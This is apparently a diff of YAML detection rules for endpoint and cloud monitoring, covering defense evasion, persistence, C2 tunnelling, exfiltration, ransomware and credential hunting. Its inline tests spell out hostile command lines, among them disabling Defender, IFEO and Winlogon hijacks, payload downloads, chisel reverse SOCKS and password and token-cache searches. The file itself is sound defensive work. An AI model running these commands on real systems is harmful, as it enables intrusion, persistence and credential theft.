     - {event: {command_line: 'systemctl restart nginx'}, expect_match: false}
+    - {name: Stop-Service on the security service, event: {command_line: 'powershell Stop-Service -Name WinDefend -Force; Set-Service WinDefend -StartupType Disabled'}, expect_match: true}
+    - {name: auditctl wipe, event: {command_line: 'auditctl -D'}, expect_match: true}
+    - {name: listing audit rules is fine, event: {command_line: 'auditctl -l'}, expect_match: false}
+    - {name: restarting an application service, event: {command_line: 'powershell Stop-Service -Name Spooler; Start-Service Spooler'}, expect_match: false}
 
 - id: TB-EVADE-008
   name: Security-weakening registry change (SMB signing, WDigest, UAC, LSA protection)
@@ -1129,6 +1257,25 @@ rules:
     - {event: {event_type: registry.value_set, raw_data: {target_object: 'HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\Public', details: 'DWORD (0x00000000)'}}, expect_match: true}
     - {name: enabling protection is fine, event: {event_type: registry.value_set, raw_data: {target_object: 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware', details: 'DWORD (0x00000000)'}}, expect_match: false}
     - {name: unrelated value, event: {event_type: registry.value_set, raw_data: {target_object: 'HKCU\Software\Vendor\Theme', details: 'dark'}}, expect_match: false}
+
+- id: TB-EVADE-012
+  name: Host firewall opened to inbound traffic without binding it to a program
+  severity: medium
+  confidence: 65
+  techniques: [T1562.004]
+  tags: [defense-evasion, firewall]
+  tuning: Application installers add inbound rules; those name the program. Rules named like built-in ones are a masquerading signal.
+  match:
+    any:
+      - all:
+          - {field: command_line, regex: 'netsh(\.exe)?\s+advfirewall\s+firewall\s+add\s+rule\s.{0,120}dir=in\b.{0,120}action=allow|netsh(\.exe)?\s+advfirewall\s+firewall\s+add\s+rule\s.{0,120}action=allow.{0,120}dir=in\b'}
+          - not: {field: command_line, regex: 'program="?[a-z]:\\'}
+      - {field: command_line, regex: 'new-netfirewallrule\s.{0,160}-direction\s+inbound.{0,160}-action\s+allow(?!.{0,120}-program)'}
+      - {field: command_line, regex: 'netsh(\.exe)?\s+(advfirewall\s+firewall|firewall)\s+(add\s+(rule|portopening|allowedprogram)|set\s+opmode).{0,160}(localport=(4444|1337|31337|9001|8081|5555|6666)|name="?(core networking|windows update|microsoft)\b)'}
+  tests:
+    - {event: {command_line: 'netsh advfirewall firewall add rule name="Core Networking" dir=in action=allow protocol=TCP localport=4444'}, expect_match: true}
+    - {event: {command_line: 'netsh advfirewall firewall add rule name="App HTTPS" dir=in action=allow protocol=TCP localport=8443 program="C:\Program Files\App\app.exe"'}, expect_match: false}
+    - {event: {command_line: 'netsh advfirewall firewall show rule name=all'}, expect_match: false}
 
 - id: TB-EVADE-003
   name: Masquerading system process running from an unexpected path
@@ -1256,6 +1403,26 @@ rules:
     - {event: {command_line: 'aws iam create-access-key --user-name backup-admin'}, expect_match: true}
     - {event: {command_line: 'aws iam list-users'}, expect_match: false}
     - {event: {raw_data: {eventName: AttachUserPolicy, requestParameters: {policyArn: 'arn:aws:iam::aws:policy/ReadOnlyAccess'}}}, expect_match: false}
+
+- id: TB-CLOUD-010
+  name: Multi-factor authentication removed or weakened for an account or tenant
+  severity: high
+  confidence: 80
+  techniques: [T1556, T1098]
+  tags: [cloud, identity, mfa]
+  tuning: Offboarding and device replacement legitimately deactivate devices; correlate with a ticket.
+  match:
+    any:
+      - {field: raw.eventName, in: [DeactivateMFADevice, DeleteVirtualMFADevice, DisableOrganizationAdminAccount]}
+      - {field: command_line, regex: 'aws\s+iam\s+(deactivate-mfa-device|delete-virtual-mfa-device)\b'}
+      - all:
+          - {field: event_type, regex: '^identity\.'}
+          - {field: text, regex: '(mfa|multi-?factor|authenticator).{0,60}(disabled|removed|unenrolled|bypass|enforcement:\s*disabled|deactivat)|(disabled|removed|deactivat).{0,60}(mfa|multi-?factor)'}
+  tests:
+    - {event: {raw_data: {eventName: DeactivateMFADevice, eventSource: iam.amazonaws.com}}, expect_match: true}
+    - {event: {event_type: identity.okta, raw_data: {eventType: policy.rule.update, change: 'MFA enforcement: DISABLED'}}, expect_match: true}
+    - {event: {raw_data: {eventName: EnableMFADevice, eventSource: iam.amazonaws.com}}, expect_match: false}
+    - {event: {event_type: identity.mfa_enroll, raw_data: {detail: authenticator app enrolled}}, expect_match: false}
 
 - id: TB-CLOUD-004
   name: Cloud root / owner account used
@@ -1397,7 +1564,7 @@ rules:
   tags: [lateral-movement, tunneling]
   match:
     any:
-      - {field: command_line, regex: '\bssh(\.exe)?\s.{0,80}-(R|L|D)\s?\S{1,40}:\d{1,5}.{0,40}(-N|-f)|\bssh\s.{0,40}-N\s.{0,60}-(R|L|D)\s?\d'}
+      - {field: command_line, regex: '\bssh(\.exe)?\s.{0,80}-(R|D)\s?\S{1,40}(:\d{1,5})?.{0,40}(-N|-f)|\bssh(\.exe)?\s.{0,40}-N\s.{0,60}-(R|D)\s?\d|\bssh(\.exe)?\s.{0,60}-L\s?(\*|0\.0\.0\.0):'}
       - {field: command_line, regex: '(plink|chisel|ligolo|frpc?|sshuttle|proxychains\d?|socat\s+tcp-listen)\b.{0,100}(-R|-L|-D|client|agent|--socks|tcp-listen)'}
   tests:
     - {event: {command_line: 'ssh -N -R 8080:127.0.0.1:3389 user@198.51.100.7'}, expect_match: true}
@@ -1466,12 +1633,53 @@ rules:
   tags: [c2, network]
   match:
     all:
-      - {field: event_type, regex: '^network\.(connection|firewall)'}
+      - {field: event_type, regex: '^network\.(connection|firewall|flow|proxy)'}
       - {field: destination_port, in: [4444, 4443, 1337, 31337, 50050, 6666, 6667, 9001, 9030, 8333]}
-      - {field: raw.direction, in: [outbound, egress, out]}
+      - not: {field: raw.direction, in: [inbound, ingress, in]}
+      - not: {field: destination_ip, cidr: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8', '169.254.0.0/16']}
   tests:
-    - {event: {event_type: network.connection, destination_port: 4444, raw_data: {direction: outbound}}, expect_match: true}
-    - {event: {event_type: network.connection, destination_port: 443, raw_data: {direction: outbound}}, expect_match: false}
+    - {event: {event_type: network.connection, destination_ip: 198.51.100.8, destination_port: 4444, raw_data: {direction: outbound}}, expect_match: true}
+    - {event: {event_type: network.flow, destination_ip: 198.51.100.8, destination_port: 6667}, expect_match: true}
+    - {name: Tor relay port, event: {event_type: network.flow, destination_ip: 198.51.100.8, destination_port: 9001}, expect_match: true}
+    - {event: {event_type: network.connection, destination_ip: 198.51.100.8, destination_port: 443, raw_data: {direction: outbound}}, expect_match: false}
+    - {name: internal destination, event: {event_type: network.connection, destination_ip: 10.0.4.4, destination_port: 4444, raw_data: {direction: outbound}}, expect_match: false}
+    - {name: inbound, event: {event_type: network.connection, destination_ip: 198.51.100.8, destination_port: 4444, raw_data: {direction: inbound}}, expect_match: false}
+
+- id: TB-NET-005
+  name: Internal host reaching an external address on a file-sharing, remote-access or legacy admin port
+  severity: medium
+  confidence: 60
+  techniques: [T1048, T1021, T1071]
+  tags: [network, exfiltration, lateral-movement]
+  tuning: Branch offices without a VPN, and SaaS that legitimately uses these ports, need an allowlist of destinations.
+  match:
+    all:
+      - {field: event_type, regex: '^network\.(connection|flow|firewall|proxy)'}
+      - {field: destination_port, in: [445, 139, 3389, 5900, 5985, 5986, 23, 135, 1433, 3306, 5432, 6379, 27017, 9200]}
+      - not: {field: destination_ip, cidr: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8', '169.254.0.0/16']}
+      - not: {field: raw.direction, in: [inbound, ingress, in]}
+      - not: {field: event_type, regex: '(deny|drop|block|reject)'}
+      - {field: source_ip, cidr: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16']}
+  tests:
+    - {event: {event_type: network.flow, source_ip: 10.0.5.22, destination_ip: 198.51.100.55, destination_port: 445}, expect_match: true}
+    - {name: SMB inside the network, event: {event_type: network.flow, source_ip: 10.0.5.22, destination_ip: 10.0.5.9, destination_port: 445}, expect_match: false}
+    - {name: HTTPS to the internet, event: {event_type: network.flow, source_ip: 10.0.5.22, destination_ip: 198.51.100.55, destination_port: 443}, expect_match: false}
+    - {name: blocked at the firewall, event: {event_type: network.firewall.deny, source_ip: 10.0.5.22, destination_ip: 198.51.100.55, destination_port: 445}, expect_match: false}
+
+  name: Host configured as a network relay (port proxy, forwarder or reverse relay)
+  severity: high
+  confidence: 75
+  techniques: [T1090.001, T1090]
+  tags: [c2, pivot, proxy]
+  tuning: Network engineers use portproxy for migrations; scope by account and change window.
+  match:
+    any:
+      - {field: command_line, regex: 'netsh(\.exe)?\s+interface\s+portproxy\s+(add|set)\s'}
+      - {field: command_line, regex: '\b(socat|redir|rinetd|gost|frpc?|ligolo\S{0,10}|chisel|revsocks)\b.{0,100}(tcp-listen|listen|:\d{2,5}.{0,30}(tcp|connect)|server\s|client\s|socks)'}
+  tests:
+    - {event: {command_line: 'netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.0.1.5 connectport=3389'}, expect_match: true}
+    - {event: {command_line: 'netsh interface portproxy show all'}, expect_match: false}
+    - {event: {command_line: 'chisel client 198.51.100.30:8000 R:socks'}, expect_match: true}
 
 - id: TB-C2-005
   name: Remote administration / tunnelling software installed or executed on a server
@@ -1479,11 +1687,12 @@ rules:
   confidence: 55
   techniques: [T1219]
   tags: [c2, remote-access-tool]
-  tuning: Expected on helpdesk endpoints; scope to servers.
+  tuning: Expected on helpdesk endpoints; scope to servers. Matches the product name in the command line as well as the process name.
   match:
     any:
       - {field: process_name, regex: '^(anydesk|teamviewer(_service)?|rustdesk|ammyy_admin|screenconnect\.clientservice|atera\w{0,10}|splashtop\w{0,10}|ultraviewer\w{0,10}|meshagent|tacticalrmm)(\.exe)?$'}
       - {field: command_line, regex: '\b(anydesk|rustdesk|meshagent|screenconnect)(\.exe)?\s.{0,40}(--install|--silent|/silent|--service|-i\s)'}
+      - {field: command_line, regex: '(start-process|\.\\|\\|/|\s)("|'')?\S{0,80}(anydesk|teamviewer(_setup|\w{0,10})?|gotoassist|netsupport\w{0,10}|ultraviewer|rustdesk|splashtop\w{0,10}|screenconnect\.\w{0,20}|connectwise\w{0,10}control|logmein\w{0,10}|ammyy\w{0,10}|radmin\w{0,10}|ultravnc|uvnc\w{0,10}|tightvnc|vncviewer|dwagent|zohoassist|supremo\w{0,10}|rutserv|meshagent|atera\w{0,10}|syncro\w{0,10})(\.exe|\.msi)?("|'')?(\s|$)'}
   tests:
     - {event: {process_name: AnyDesk.exe}, expect_match: true}
     - {event: {process_name: chrome.exe}, expect_match: false}
@@ -1555,7 +1764,10 @@ rules:
       - {field: command_line, regex: '\b(megacmd|mega-put|megatools\s+put|mega-cmd)\b'}
       - {field: command_line, regex: 'aws\s+s3\s+(cp|sync|mv)\s.{0,100}s3://(?!(corp|internal))\S{1,60}'}
       - {field: command_line, regex: '(gsutil\s+(cp|rsync)|az\s+storage\s+blob\s+upload(-batch)?|azcopy\s+(copy|sync))\s.{0,160}(https?://|gs://|\.blob\.core\.windows\.net)'}
-      - {field: command_line, regex: 'curl\s.{0,80}(-T|--upload-file|-F\s?\S{1,20}=@|--data-binary\s@).{0,120}https?://'}
+      - {field: command_line, regex: 'curl(\.exe)?\s.{0,80}(-T|--upload-file|-F\s?\S{1,20}=@|--data-binary\s@|-d\s@).{0,160}(https?|ftps?|sftp|scp)://(?!(localhost|127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.))'}
+      - {field: command_line, regex: '(invoke-restmethod|invoke-webrequest|irm|iwr)\s.{0,100}-(method\s+(post|put)).{0,100}-infile'}
+      - {field: command_line, regex: '(tftp|ftp)(\.exe)?\s+(-i\s+)?\S{1,40}\s+put\s'}
+      - {field: command_line, regex: '(nc|ncat|netcat)(\.exe)?\s.{0,60}\s(\d{1,3}\.){3}\d{1,3}\s\d{2,5}\s{0,3}<\s{0,3}\S'}
       - {field: command_line, regex: '(scp|rsync)\s.{0,40}-\w*r\w*\s.{0,80}\S+@(\d{1,3}\.){3}\d{1,3}:'}
   tests:
     - {event: {command_line: 'rclone copy /srv/data remote:exfil --transfers 16'}, expect_match: true}
@@ -1607,7 +1819,7 @@ rules:
       - {field: text, regex: '\.(locked|crypt|crypted|encrypted|lockbit|ryuk|conti|akira|blackcat|royal|hive|babuk|wncry|petya|djvu|cerber|basta|play|rhysida)\b'}
       - {field: text, regex: '(your (files|data|network) (have been|are|were|is) (encrypted|locked|stolen)|all your files|decrypt(ion)? (key|tool|your files)|pay(ment)? .{0,30}(bitcoin|btc|monero)|how[_ ]?to[_ ]?(restore|recover|decrypt)|restore[-_ ]my[-_ ]files|readme[_-]?(to[_-])?(decrypt|restore))'}
       - {field: event_type, regex: 'ransom'}
-      - {field: command_line, regex: '(cipher(\.exe)?\s+/w:|gpg\s.{0,60}--symmetric.{0,80}/(home|srv|var)|openssl\s+enc\s.{0,60}-aes.{0,120}-in\s+/(home|srv|var))'}
+      - {field: command_line, regex: '(cipher(\.exe)?\s+/w:|(find|xargs|for\s+\w+\s+in|while\s+read).{0,200}(gpg\s.{0,60}(--symmetric|-c\b)|openssl\s+enc\s.{0,60}-aes))'}
   tests:
     - {event: {title: 'File renamed to report.docx.lockbit'}, expect_match: true}
     - {event: {event_type: file.create, raw_data: {file_name: 'README_TO_DECRYPT.txt', content: 'Your files have been encrypted. Pay 2 BTC'}}, expect_match: true}
@@ -1842,3 +2054,329 @@ rules:
   tests:
     - {event: {raw_data: {eventType: user.mfa.factor.reset_all}}, expect_match: true}
     - {event: {raw_data: {eventType: user.session.start}}, expect_match: false}
+
+# =============================================================== ROUND 3 ADDITIONS
+# Added after the independent Atomic Red Team evaluation (tuning half only; the blind half was never inspected). Each rule keeps
+# its benign twins as inline tests: a pattern that cannot tell an administrator from an adversary is not a rule.
+- id: TB-PERSIST-008
+  name: Registry autostart, hijack or logon-persistence value written (command line)
+  severity: high
+  confidence: 75
+  techniques: [T1547.001, T1546.012, T1546.015, T1112]
+  tags: [persistence, registry]
+  tuning: Installers write Run keys and COM registrations. Values under Program Files / Windows are ignored; add your software-deployment account to the exclusions.
+  match:
+    all:
+      - any:
+          - {field: command_line, regex: '(\breg(\.exe)?\s+add|\breg(\.exe)?\s+import|set-itemproperty|new-itemproperty|new-item\b|\bsp\s|set-item\s|\bsi\s)'}
+      - any:
+          - all:
+              - {field: command_line, regex: '\\currentversion\\(run|runonce|runonceex|runservices|policies\\explorer\\run)\b'}
+              - not: {field: command_line, regex: '(c:\\program files|c:\\windows\\system32|%programfiles|%systemroot%|%windir%)[^ ]{0,200}\.(exe|dll)'}
+          - {field: command_line, regex: '\\windows nt\\currentversion\\(winlogon\b.{0,60}\b(shell|userinit|notify|appsetup|taskman|vmapplet)\b|windows\b.{0,40}\b(appinit_dlls|load|run)\b|image file execution options\\\S{1,40}|silentprocessexit)'}
+          - {field: command_line, regex: '\\environment\b.{0,40}userinitmprlogonscript|\\control panel\\desktop\b.{0,40}scrnsave\.exe|\\user shell folders\b.{0,60}startup|\\command processor\b.{0,40}autorun'}
+          - {field: command_line, regex: '(\\classes)?\\clsid\\\{[0-9a-f-]{36}\}\\(inprocserver32|localserver32|shell\\open\\command|treatas)|\\classes\\(ms-settings|mscfile|exefile|folder|appx\w{4,40}|\.\w{2,6}file)\\shell\\open\\command'}
+          - {field: command_line, regex: '\\control\\(lsa\b.{0,40}(authentication packages|security packages|notification packages)|session manager\b.{0,40}(bootexecute|appcertdlls)|print\\monitors|timeproviders|netsh)\b'}
+          - {field: command_line, regex: '\\services\\\S{1,60}\b.{0,30}(imagepath|servicedll)'}
+  tests:
+    - {event: {command_line: 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\bob\AppData\upd.exe /f'}, expect_match: true}
+    - {name: Winlogon Userinit appended, event: {command_line: 'Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "C:\Windows\system32\userinit.exe,C:\Users\Public\a.exe"'}, expect_match: true}
+    - {name: shell open command hijack, event: {command_line: 'reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /d "calc.exe" /f'}, expect_match: true}
+    - {name: IFEO debugger, event: {command_line: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d cmd.exe'}, expect_match: true}
+    - {name: vendor autostart under Program Files, event: {command_line: 'reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Zoom /t REG_SZ /d "C:\Program Files\Zoom\bin\Zoom.exe" /f'}, expect_match: false}
+    - {name: reading the Run key, event: {command_line: 'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run'}, expect_match: false}
+    - {name: unrelated vendor setting, event: {command_line: 'reg add HKCU\Software\Vendor\App /v Theme /d dark'}, expect_match: false}
+
+- id: TB-EVADE-013
+  name: Protection or audit control switched off through the registry or execution policy (command line)
+  severity: high
+  confidence: 75
+  techniques: [T1112, T1562.001, T1548.002, T1021.001]
+  tags: [defense-evasion, registry, uac, rdp]
+  tuning: Hardening baselines and GPO tooling write these values; exclude the managing account or process.
+  match:
+    all:
+      - any:
+          - {field: command_line, regex: '(\breg(\.exe)?\s+add|set-itemproperty|new-itemproperty|\bsp\s|set-executionpolicy|set-mppreference|add-mppreference)'}
+      - any:
+          - {field: command_line, regex: '\\policies\\system\b.{0,80}\b(enablelua|consentpromptbehavioradmin|filteradministratortoken|promptonsecuredesktop|enableinstallerdetection|enablevirtualization)\b.{0,60}(/d\s+0\b|-value\s+0\b)'}
+          - {field: command_line, regex: '\\policies\\system\b.{0,80}\blocalaccounttokenfilterpolicy\b.{0,60}(/d\s+1\b|-value\s+1\b)'}
+          - {field: command_line, regex: '\\(policies|software)\\.{0,100}\b(disabletaskmgr|disableregistrytools|disablecmd|disablelockworkstation|norun|nodrives|disablecontextmenusinstartmenu)\b.{0,60}(/d\s+1\b|-value\s+1\b|0x0+1\b)'}
+          - {field: command_line, regex: '\\terminal server\b.{0,80}(fdenytsconnections\b.{0,40}(/d\s+0\b|-value\s+0\b)|userauthentication\b.{0,40}(/d\s+0\b|-value\s+0\b)|allowremotertfm\b.{0,30}1)'}
+          - {field: command_line, regex: 'set-executionpolicy\s.{0,40}(bypass|unrestricted)\b'}
+          - {field: command_line, regex: '\\microsoft\\office\\\S{0,60}\\(security\\)?(accessvbom|vbawarnings|blockcontentexecutionfrominternet|trusted locations)\b.{0,40}(/d\s+[01]\b|-value\s+[01]\b)'}
+          - {field: command_line, regex: '\\control\\securityproviders\\wdigest\b.{0,60}uselogoncredential'}
+          - {field: command_line, regex: '\\windows defender\b.{0,100}(exclusions|disable\w{3,30}|passiveMode|tamperprotection)'}
+  tests:
+    - {event: {command_line: 'cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f'}, expect_match: true}
+    - {event: {command_line: 'New-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name DisableCMD -Value 1'}, expect_match: true}
+    - {event: {command_line: 'Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine'}, expect_match: true}
+    - {event: {command_line: 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'}, expect_match: true}
+    - {event: {command_line: 'Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0'}, expect_match: true}
+    - {name: restoring the secure value, event: {command_line: 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f'}, expect_match: false}
+    - {name: querying, event: {command_line: 'reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'}, expect_match: false}
+    - {name: execution policy RemoteSigned is the sane default, event: {command_line: 'Set-ExecutionPolicy RemoteSigned -Scope CurrentUser'}, expect_match: false}
+
+- id: TB-EVADE-014
+  name: Signed Windows binary copied to another name or location (renamed LOLBin)
+  severity: medium
+  confidence: 65
+  techniques: [T1036.003, T1218]
+  tags: [defense-evasion, masquerading, lolbin]
+  tuning: Some backup and imaging tools copy system binaries; scope by account.
+  match:
+    any:
+      - {field: command_line, regex: '(copy|move|xcopy|copy-item|cp)\s+("|'')?\S{0,40}\\(system32|syswow64)\\(certutil|rundll32|regsvr32|mshta|wscript|cscript|bitsadmin|msbuild|installutil|cmstp|ie4uinit|wmic|forfiles|powershell|cmd|odbcconf|regsvcs|regasm|msiexec|esentutl)\.exe("|'')?\s+("|'')?\S{1,120}'}
+      - {field: command_line, regex: '\b(mkdir|md|new-item\s+-itemtype\s+directory)\s+"?\\\\\?\\[a-z]:\\windows\s+\\system32'}
+  tests:
+    - {event: {command_line: 'copy %windir%\system32\certutil.exe %temp%\tcm.tmp'}, expect_match: true}
+    - {event: {command_line: 'copy c:\windows\system32\ie4uinit.exe %TEMP%\ie4uinit.exe'}, expect_match: true}
+    - {name: mocked trusted directory, event: {command_line: 'mkdir "\\?\C:\Windows \System32\"'}, expect_match: true}
+    - {name: copying an ordinary file, event: {command_line: 'copy C:\reports\q1.xlsx D:\backup\q1.xlsx'}, expect_match: false}
+
+- id: TB-EXEC-010
+  name: Executable or script downloaded to disk by a command-line client
+  severity: medium
+  confidence: 60
+  techniques: [T1105, T1204]
+  tags: [ingress-tool-transfer, download]
+  tuning: Build agents and installers (choco, scoop, nvm, rustup) fetch scripts and binaries; exclude by parent_process or destination path.
+  match:
+    any:
+      - {field: command_line, regex: '(invoke-webrequest|invoke-restmethod|\biwr\b|\birm\b|\bcurl(\.exe)?(?=\s)|\bwget(\.exe)?(?=\s)|start-bitstransfer|\.downloadfile\s*\(|\.downloaddata\s*\(|certutil(\.exe)?(?=\s).{0,40}-urlcache|bitsadmin(\.exe)?(?=\s).{0,40}/(transfer|addfile)).{0,260}\.(exe|dll|ps1|psm1|bat|cmd|vbs|vbe|js|jse|hta|sct|sh|elf|jar|msi|scr|lnk|py|bin)\b'}
+      - all:
+          - {field: command_line, regex: '(invoke-webrequest|invoke-restmethod|\biwr\b|\bcurl(\.exe)?\b|\bwget(\.exe)?\b|start-bitstransfer|\.downloadfile\s*\()'}
+          - {field: command_line, regex: 'https?://(\d{1,3}\.){3}\d{1,3}(:\d+)?/'}
+          - {field: command_line, regex: '(-outfile|\s-o\s|\s-o\.|-o/|--output|\s>\s?|\.downloadfile)'}
+  tests:
+    - {event: {command_line: '(New-Object System.Net.WebClient).DownloadFile("https://203.0.113.9/payload.exe", "$env:TEMP\p.exe")'}, expect_match: true}
+    - {event: {command_line: 'curl -fsSL https://203.0.113.9/install.sh -o /tmp/i.sh'}, expect_match: true}
+    - {event: {command_line: 'Invoke-WebRequest -Uri http://203.0.113.9/a -OutFile C:\Users\Public\a'}, expect_match: true}
+    - {name: package tarball is routine, event: {command_line: 'wget https://downloads.example.com/pkg-1.2.tar.gz -O /tmp/pkg.tgz'}, expect_match: false}
+    - {name: API call without a file, event: {command_line: 'curl.exe -fsS https://api.vendor.example/health'}, expect_match: false}
+    - {name: page saved to disk, event: {command_line: 'curl -o /tmp/page.html https://example.org'}, expect_match: false}
+
+- id: TB-CRED-006
+  name: Credential material hunted in files, stores or cloud/CI token caches
+  severity: medium
+  confidence: 65
+  techniques: [T1552.001, T1555, T1552.004]
+  tags: [credential-access, secrets, discovery]
+  tuning: Secret scanners and backup agents read these; exclude by process_name.
+  match:
+    any:
+      - {field: command_line, regex: '(findstr|select-string|sls)\s.{0,60}("|'')?(pass(word|wd)?|pwd|secret|cred(ential)?s?|api[_-]?key|token)("|'')?.{0,80}(\*\.(xml|ini|config|txt|cfg|conf|ps1|env|json|yml|yaml|bat|cmd|vbs)|-recurse|/s\b)'}
+      - {field: command_line, regex: '\b(dir|ls|get-childitem|gci)\b.{0,60}(\*(pass|cred|secret|vnc)\w{0,10}\*|\*\.(kdbx|pfx|p12|ppk|pem|key|ovpn)\b)'}
+      - {field: command_line, regex: '(type|cat|more|get-content|gc)\s+\S{0,80}(unattend|sysprep|autounattend|groups|services|scheduledtasks|printers|drives|datasources)\.xml\b'}
+      - {field: command_line, regex: '\\(microsoft\\(credentials|vault|protect)|google\\chrome\\user data\\default\\login data)\b.{0,30}'}
+      - {field: command_line, regex: '\b(vaultcmd|cmdkey)(\.exe)?\s+/(list|listcreds)|reg(\.exe)?\s+query\s.{0,80}/f\s+("|'')?pass(word)?("|'')?.{0,30}/s'}
+      - {field: command_line, regex: '\bfind\s+/\S{0,10}\s.{0,80}(-name|-path)\s+("|'')?\*?/?\.?(azure|oci|aws|gcloud|kube|docker|boto|s3cfg|netrc|pgpass|git-credentials|npmrc|pypirc)\S{0,30}|\bfind\s+/\S{0,10}\s.{0,60}-name\s+("|'')?(terraform\.tf(vars|state)|id_rsa|id_ed25519|credentials|\*\.(kdbx|pem|ppk))'}
+      - {field: command_line, regex: '(msal_token_cache|accesstokens|azureprofile)\.json|\.config/gcloud/(credentials|access_tokens)|\.azure/'}
+      - {field: command_line, regex: '\b(lazagne|mimikittenz|snaffler|seatbelt\s+-group|credentialsfileview|sharpdpapi|sharpchrome|donpapi)\b'}
+  tests:
+    - {event: {command_line: 'findstr /si password *.xml *.ini *.txt'}, expect_match: true}
+    - {event: {command_line: 'type C:\Windows\Panther\unattend.xml'}, expect_match: true}
+    - {event: {command_line: 'dir /a:h C:\Users\bob\AppData\Local\Microsoft\Credentials\'}, expect_match: true}
+    - {event: {command_line: "find / -path '*/.azure/msal_token_cache.json' -type f 2>/dev/null"}, expect_match: true}
+    - {event: {command_line: 'reg query HKLM /f password /t REG_SZ /s'}, expect_match: true}
+    - {event: {command_line: 'cmdkey /list'}, expect_match: true}
+    - {name: ordinary search, event: {command_line: 'findstr /si TODO *.cs'}, expect_match: false}
+    - {name: ordinary listing, event: {command_line: 'dir C:\reports /s'}, expect_match: false}
+    - {name: reading a hosts file, event: {command_line: 'type C:\Windows\System32\drivers\etc\hosts'}, expect_match: false}
+
+- id: TB-EXEC-011
+  name: Signed-binary proxy execution through a known abusable export or switch
+  severity: high
+  confidence: 75
+  techniques: [T1218.011, T1218, T1218.005, T1218.010]
+  tags: [lolbin, proxy-execution, defense-evasion]
+  tuning: Control-panel applets use shell32 Control_RunDLL; the pattern here requires a non-standard target.
+  match:
+    any:
+      - {field: command_line, regex: 'rundll32(\.exe)?\s+(vbscript|javascript):'}
+      - {field: command_line, regex: 'rundll32(\.exe)?\s+("|'')?(url|ieframe)\.dll,\s?(openurl|fileprotocolhandler)|rundll32(\.exe)?\s+pcwutl\.dll,\s?launchapplication|rundll32(\.exe)?\s+syssetup\.dll,\s?setupinfobjectinstallaction|rundll32(\.exe)?\s+(ie)?advpack\.dll,\s?(launchinfsection|registerocx|launchinfsectionex)|rundll32(\.exe)?\s+zipfldr\.dll,\s?routethecall|rundll32(\.exe)?\s+setupapi\.dll,\s?installhinfsection|rundll32(\.exe)?\s+(dfshim|davclnt|xwizards)\.dll,\s?(shopenverbshortcut|davsetcookie|runwizard|wizard)|rundll32(\.exe)?\s+desk\.cpl,\s?installscreensaver|rundll32(\.exe)?\s+shell32\.dll,\s?(shellexec_rundll|control_rundll(async)?)\s+("|'')?\S{0,100}(\\temp\\|\\users\\public\\|\\appdata\\|\\programdata\\|\\atomic|\.dll|\.inf)'}
+      - {field: command_line, regex: 'mshta(\.exe)?\s+("|'')?\S{0,100}\.(hta|sct)\b|mshta(\.exe)?\s+.{0,40}(vbscript|javascript):'}
+      - {field: command_line, regex: 'regsvr32(\.exe)?\s+(/s\s+)?(/n\s+)?(/u\s+)?/i:\S{1,200}|regsvr32(\.exe)?\s.{0,40}\.sct\b'}
+      - {field: command_line, regex: '\bdiskshadow(\.exe)?\s+(/s|-s)\s|\bgpscript(\.exe)?\s+/(startup|logon)|\bpcalua(\.exe)?\s+-a\b|\binfdefaultinstall(\.exe)?\s|\bmsdt(\.exe)?\s+-id\s|\bsyncappvpublishingserver(\.exe)?\s|\bodbcconf(\.exe)?\s+(/s\s+)?/a\s+\{regsvr|\bmicrosoft\.workflow\.compiler(\.exe)?\s|\bftp(\.exe)?\s+-s:|\bpresentationhost(\.exe)?\s.{0,40}\.(xbap|application)|\bmavinject(\.exe)?\s+\d+\s+/injectrunning'}
+      - {field: command_line, regex: '\bdesktopimgdownldr(\.exe)?\s.{0,40}/lockscreenurl:|\bmofcomp(\.exe)?\s+("|'')?\S{1,160}\.mof\b|regsvr32(\.exe)?\s+(/s\s+)?/[in]\b.{0,6}("|'')?\S{0,200}\.dll\b|\bmshta(\.exe)?\s+("|'')?about:'}
+      - {field: command_line, regex: '\bmsbuild(\.exe)?\s+("|'')?\S{0,200}\.(xml|proj|targets|tasks|inc)\b|\b(enable-psremoting|winrm\s+quickconfig|new-psdrive\s.{0,80}\\\\\S{1,40}\\(c|admin)\$)'}
+      - {field: command_line, regex: '\bie4uinit(\.exe)?\s+-basesettings|\bcmstp(\.exe)?\s+(/s\s+)?(/au\s+)?\S{1,120}\.inf|\bmsiexec(\.exe)?\s+/(y|z)\s'}
+  tests:
+    - {event: {command_line: 'rundll32.exe pcwutl.dll,LaunchApplication %windir%\System32\notepad.exe'}, expect_match: true}
+    - {event: {command_line: 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 "C:\AtomicRedTeam\atomics\x.inf"'}, expect_match: true}
+    - {event: {command_line: 'rundll32.exe url.dll,OpenURL "C:\x\index.hta"'}, expect_match: true}
+    - {event: {command_line: 'rundll32.exe shell32.dll,Control_RunDLL "C:\AtomicRedTeam\atomics\T1047\bin\calc.dll"'}, expect_match: true}
